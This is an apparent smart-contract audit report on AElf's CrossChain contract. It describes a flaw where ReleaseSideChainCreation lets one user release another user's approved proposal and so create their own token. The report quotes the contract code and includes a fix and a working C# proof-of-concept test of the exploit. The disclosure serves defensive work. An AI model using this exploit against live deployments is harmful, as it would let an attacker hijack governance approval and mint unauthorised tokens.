# Audit Report

## Title 
Proposal-Request Mismatch in ReleaseSideChainCreation Allows Unauthorized Token Creation

## Summary
The `ReleaseSideChainCreation()` function retrieves the side chain creation request from `Context.Sender`'s storage but releases a proposal specified by `input.ProposalId` without validating these are correlated. This allows an attacker with a pending request to release any approved proposal, creating a token for the attacker while consuming the victim's governance-approved proposal.

## Finding Description

The vulnerability exists in `ReleaseSideChainCreation()` where token creation and proposal release operate on disconnected data sources without validation. [1](#0-0) 

At line 100, the function retrieves the creation request keyed by `Context.Sender`. At lines 106-107, token creation uses this retrieved request (including the attacker's token parameters: symbol, supply, decimals). At lines 108-110, the function releases `input.ProposalId` which may belong to a completely different user. **There is no validation that `input.ProposalId` was created by or corresponds to `Context.Sender`'s stored request.**

When a proposal is created via `ProposeNewSideChain()`, it stores the proposal in the governance contract with the proposer embedded in the params: [2](#0-1) 

At line 372, the proposal params include both the creation request and the proposer address.

When the proposal is released by the governance contract, it calls `CreateSideChain()` with the proposer from the proposal params: [3](#0-2) 

At line 126, it retrieves the request state keyed by `input.Proposer` (the victim's address from the proposal), not `Context.Sender`.

The token creation logic is: [4](#0-3) 

At lines 189-194, the token is created with the `creator` as both Issuer and Owner, using token parameters from the creation request.

**Attack Flow:**
1. User A calls `RequestSideChainCreation` with request (token symbol "AAA", supply 1000)
2. User B calls `RequestSideChainCreation` with request (token symbol "BBB", supply 2000) 
3. Parliament approves User A's proposal
4. User B calls `ReleaseSideChainCreation(User_A_ProposalId)`
5. Token "BBB" is created with User B as issuer/owner
6. User A's proposal is consumed for side chain creation
7. User A's token is never created despite governance approval

The Parliament contract's `Release` method checks that the caller is the proposal's proposer: [5](#0-4) 

However, at line 135, this check verifies `Context.Sender` (the CrossChain contract when called via SendInline) equals `proposalInfo.Proposer`. Since proposals created via `CreateProposalBySystemContract` store the system contract as the proposer: [6](#0-5) 

At line 237, `Proposer = Context.Sender` stores the CrossChain contract address. This means any call from CrossChain contract can release any CrossChain-created proposal, bypassing user-level authorization.

## Impact Explanation

**Direct Economic Impact**: The attacker obtains a token on the main chain with their chosen parameters (symbol, supply, decimals) with themselves as issuer and owner. They can issue these tokens to themselves or others, gaining economic value without governance approval.

**Governance Integrity Impact**: The victim's approved proposal is consumed but their token is not created. The governance process is circumvented - a proposal that was reviewed and approved for User A's token creation is instead used to create User B's token.

**Protocol Invariant Violation**: The system's guarantee that "an approved proposal creates the token specified in that proposal" is broken. Token creation and side chain creation operate on different users' requests, violating atomicity.

**Affected Parties**:
- Victim: Approved proposal consumed without receiving token creation benefit
- Attacker: Receives unauthorized token creation without governance approval
- Protocol: Governance integrity compromised, enabling arbitrary token creation

## Likelihood Explanation

**Attacker Capabilities Required**: 
- Submit side chain creation request via `RequestSideChainCreation()` (public method, no special privileges)
- Observe victim's approved proposal ID (publicly visible on-chain)
- Call `ReleaseSideChainCreation()` with victim's proposal ID (public method)

**Attack Complexity**: Low - single transaction exploit with no complex setup. Proposal IDs are observable from blockchain events/state.

**Preconditions**:
- Multiple users have pending side chain creation requests (common in production)
- At least one proposal is approved by Parliament (happens regularly)
- No authorization check prevents calling `ReleaseSideChainCreation()` with arbitrary proposal IDs

**Economic Rationality**: If tokens have value (through issuer privileges, initial distribution rights, or secondary market value), the attack provides direct economic benefit. The cost is only gas fees, while the benefit is obtaining governance-approved token creation.

**Probability**: High - the vulnerability is trivially exploitable whenever the preconditions exist, which is the normal operating state of the protocol.

## Recommendation

Add validation in `ReleaseSideChainCreation()` to ensure the proposal ID corresponds to the caller's stored request. Store the proposal ID when creating the request, then verify it matches:

```csharp
public override Empty ReleaseSideChainCreation(ReleaseSideChainCreationInput input)
{
    var sideChainCreationRequest = State.ProposedSideChainCreationRequestState[Context.Sender];
    Assert(sideChainCreationRequest != null, "Release side chain creation failed.");
    Assert(sideChainCreationRequest.ProposalId == input.ProposalId, "Proposal ID mismatch.");
    
    if (!TryClearExpiredSideChainCreationRequestProposal(input.ProposalId, Context.Sender))
    {
        // ... rest of the logic
    }
    return new Empty();
}
```

Modify `SideChainCreationRequestState` to include the proposal ID, and store it in `ProposeNewSideChain()`:

```csharp
var proposalId = Context.GenerateId(sideChainLifeTimeController.ContractAddress, proposalCreationInput.ProposalInput.Token);
var sideChainCreationRequest = new SideChainCreationRequestState
{
    SideChainCreationRequest = request,
    ExpiredTime = proposalCreationInput.ProposalInput.ExpiredTime,
    Proposer = proposer,
    ProposalId = proposalId  // Add this field
};
```

## Proof of Concept

```csharp
[Fact]
public async Task ProposalRequestMismatch_AllowsUnauthorizedTokenCreation()
{
    await InitializeCrossChainContractAsync();
    
    // User A creates request with token "AAA"
    long lockedTokenAmount = 10;
    await ApproveBalanceAsync(lockedTokenAmount);
    var userAProposalId = await CreateSideChainProposalAsync(1, lockedTokenAmount, null, 
        GetValidResourceAmount(), true);
    
    // User B creates request with token "BBB" 
    var userBKeyPair = SampleECKeyPairs.KeyPairs[1];
    var userBStub = GetCrossChainContractStub(userBKeyPair);
    var userBTokenStub = GetTokenContractStub(userBKeyPair);
    await userBTokenStub.Approve.SendAsync(new ApproveInput
    {
        Spender = CrossChainContractAddress,
        Symbol = "ELF",
        Amount = lockedTokenAmount
    });
    var userBRequest = CreateSideChainCreationRequest(1, lockedTokenAmount,
        GetValidResourceAmount(), new[] { new SideChainTokenInitialIssue { Address = userBKeyPair.PublicKey.ToAddress(), Amount = 100 } }, true);
    userBRequest.SideChainTokenCreationRequest.SideChainTokenSymbol = "BBB";
    await userBStub.RequestSideChainCreation.SendAsync(userBRequest);
    
    // Parliament approves User A's proposal
    await ApproveWithMinersAsync(userAProposalId);
    
    // User B releases User A's proposal - EXPLOIT
    var releaseTx = await userBStub.ReleaseSideChainCreation.SendAsync(
        new ReleaseSideChainCreationInput { ProposalId = userAProposalId });
    
    // Verify: Token "BBB" was created (User B's token) instead of "AAA" (User A's token)
    var tokenCreatedEvent = TokenCreated.Parser.ParseFrom(
        releaseTx.TransactionResult.Logs.First(l => l.Name.Contains(nameof(TokenCreated))).NonIndexed);
    tokenCreatedEvent.Symbol.ShouldBe("BBB");  // User B's token created
    tokenCreatedEvent.Issuer.ShouldBe(userBKeyPair.PublicKey.ToAddress());  // User B is issuer
    
    // User A's proposal was consumed but their token "AAA" was never created
    var tokenAAA = await TokenContractStub.GetTokenInfo.CallAsync(new GetTokenInfoInput { Symbol = "AAA" });
    tokenAAA.Symbol.ShouldBeEmpty();  // Token "AAA" does not exist
}
```

### Citations

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract.cs (L98-114)
```csharp
    public override Empty ReleaseSideChainCreation(ReleaseSideChainCreationInput input)
    {
        var sideChainCreationRequest = State.ProposedSideChainCreationRequestState[Context.Sender];
        Assert(sideChainCreationRequest != null, "Release side chain creation failed.");
        if (!TryClearExpiredSideChainCreationRequestProposal(input.ProposalId, Context.Sender))
        {
            var serialNumber = State.SideChainSerialNumber.Value.Add(1);
            var chainId = GetChainId(serialNumber);
            CreateSideChainToken(sideChainCreationRequest.SideChainCreationRequest, chainId,
                sideChainCreationRequest.Proposer);
            Context.SendInline(State.SideChainLifetimeController.Value.ContractAddress,
                nameof(AuthorizationContractContainer.AuthorizationContractReferenceState.Release),
                input.ProposalId);
        }

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract.cs (L121-167)
```csharp
    public override Int32Value CreateSideChain(CreateSideChainInput input)
    {
        // side chain creation should be triggered by organization address.
        AssertSideChainLifetimeControllerAuthority(Context.Sender);

        var proposedSideChainCreationRequestState = State.ProposedSideChainCreationRequestState[input.Proposer];
        State.ProposedSideChainCreationRequestState.Remove(input.Proposer);
        var sideChainCreationRequest = input.SideChainCreationRequest;
        Assert(
            proposedSideChainCreationRequestState != null &&
            proposedSideChainCreationRequestState.SideChainCreationRequest.Equals(sideChainCreationRequest),
            "Side chain creation failed without proposed data.");
        AssertValidSideChainCreationRequest(sideChainCreationRequest, input.Proposer);

        State.SideChainSerialNumber.Value = State.SideChainSerialNumber.Value.Add(1);
        var serialNumber = State.SideChainSerialNumber.Value;
        var chainId = GetChainId(serialNumber);
        State.AcceptedSideChainCreationRequest[chainId] = sideChainCreationRequest;

        // lock token
        ChargeSideChainIndexingFee(input.Proposer, sideChainCreationRequest.LockedTokenAmount, chainId);

        var sideChainInfo = new SideChainInfo
        {
            Proposer = input.Proposer,
            SideChainId = chainId,
            SideChainStatus = SideChainStatus.Active,
            IndexingPrice = sideChainCreationRequest.IndexingPrice,
            IsPrivilegePreserved = sideChainCreationRequest.IsPrivilegePreserved,
            CreationTimestamp = Context.CurrentBlockTime,
            CreationHeightOnParentChain = Context.CurrentHeight,
            IndexingFeeController = CreateDefaultOrganizationForIndexingFeePriceManagement(input.Proposer)
        };
        State.SideChainInfo[chainId] = sideChainInfo;
        State.CurrentSideChainHeight[chainId] = 0;

        var chainInitializationData =
            GetChainInitializationData(sideChainInfo, sideChainCreationRequest);
        State.SideChainInitializationData[sideChainInfo.SideChainId] = chainInitializationData;

        Context.Fire(new SideChainCreatedEvent
        {
            ChainId = chainId,
            Creator = input.Proposer
        });
        return new Int32Value { Value = chainId };
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L176-195)
```csharp
    private void CreateSideChainToken(SideChainCreationRequest sideChainCreationRequest, int chainId,
        Address creator)
    {
        if (!IsPrimaryTokenNeeded(sideChainCreationRequest))
            return;

        // new token needed only for exclusive side chain
        SetContractStateRequired(State.TokenContract, SmartContractConstants.TokenContractSystemName);
        State.TokenContract.Create.Send(new CreateInput
        {
            TokenName = sideChainCreationRequest.SideChainTokenCreationRequest.SideChainTokenName,
            Decimals = sideChainCreationRequest.SideChainTokenCreationRequest.SideChainTokenDecimals,
            IsBurnable = true,
            Issuer = creator,
            IssueChainId = chainId,
            Symbol = sideChainCreationRequest.SideChainTokenCreationRequest.SideChainTokenSymbol,
            TotalSupply = sideChainCreationRequest.SideChainTokenCreationRequest.SideChainTokenTotalSupply,
            Owner = creator
        });
    }
```

**File:** contract/AElf.Contracts.CrossChain/CrossChainContract_Helper.cs (L360-388)
```csharp
    private SideChainCreationRequestState ProposeNewSideChain(SideChainCreationRequest request, Address proposer)
    {
        var sideChainLifeTimeController = GetSideChainLifetimeController();
        var proposalCreationInput = new CreateProposalBySystemContractInput
        {
            ProposalInput =
                new CreateProposalInput
                {
                    ContractMethodName = nameof(CreateSideChain),
                    ToAddress = Context.Self,
                    ExpiredTime =
                        Context.CurrentBlockTime.AddSeconds(SideChainCreationProposalExpirationTimePeriod),
                    Params = new CreateSideChainInput { SideChainCreationRequest = request, Proposer = proposer }
                        .ToByteString(),
                    OrganizationAddress = sideChainLifeTimeController.OwnerAddress
                },
            OriginProposer = Context.Sender
        };
        Context.SendInline(sideChainLifeTimeController.ContractAddress,
            nameof(AuthorizationContractContainer.AuthorizationContractReferenceState
                .CreateProposalBySystemContract), proposalCreationInput);
        var sideChainCreationRequest = new SideChainCreationRequestState
        {
            SideChainCreationRequest = request,
            ExpiredTime = proposalCreationInput.ProposalInput.ExpiredTime,
            Proposer = proposer
        };
        return sideChainCreationRequest;
    }
```

**File:** contract/AElf.Contracts.Parliament/Parliament.cs (L132-145)
```csharp
    public override Empty Release(Hash proposalId)
    {
        var proposalInfo = GetValidProposal(proposalId);
        Assert(Context.Sender.Equals(proposalInfo.Proposer), "No permission.");
        var organization = State.Organizations[proposalInfo.OrganizationAddress];
        Assert(IsReleaseThresholdReached(proposalInfo, organization), "Not approved.");
        Context.SendVirtualInlineBySystemContract(
            CalculateVirtualHash(organization.OrganizationHash, organization.CreationToken), proposalInfo.ToAddress,
            proposalInfo.ContractMethodName, proposalInfo.Params);
        Context.Fire(new ProposalReleased { ProposalId = proposalId });
        State.Proposals.Remove(proposalId);

        return new Empty();
    }
```

**File:** contract/AElf.Contracts.Parliament/Parliament_Helper.cs (L225-253)
```csharp
    private Hash CreateNewProposal(CreateProposalInput input)
    {
        CheckCreateProposalInput(input);
        var proposalId = GenerateProposalId(input);
        var proposal = new ProposalInfo
        {
            ContractMethodName = input.ContractMethodName,
            ExpiredTime = input.ExpiredTime,
            Params = input.Params,
            ToAddress = input.ToAddress,
            OrganizationAddress = input.OrganizationAddress,
            ProposalId = proposalId,
            Proposer = Context.Sender,
            ProposalDescriptionUrl = input.ProposalDescriptionUrl,
            Title = input.Title,
            Description = input.Description
        };
        Assert(Validate(proposal), "Invalid proposal.");
        Assert(State.Proposals[proposalId] == null, "Proposal already exists.");
        State.Proposals[proposalId] = proposal;
        Context.Fire(new ProposalCreated
        {
            ProposalId = proposalId, 
            OrganizationAddress = input.OrganizationAddress,
            Title = input.Title,
            Description = input.Description
        });
        return proposalId;
    }
```
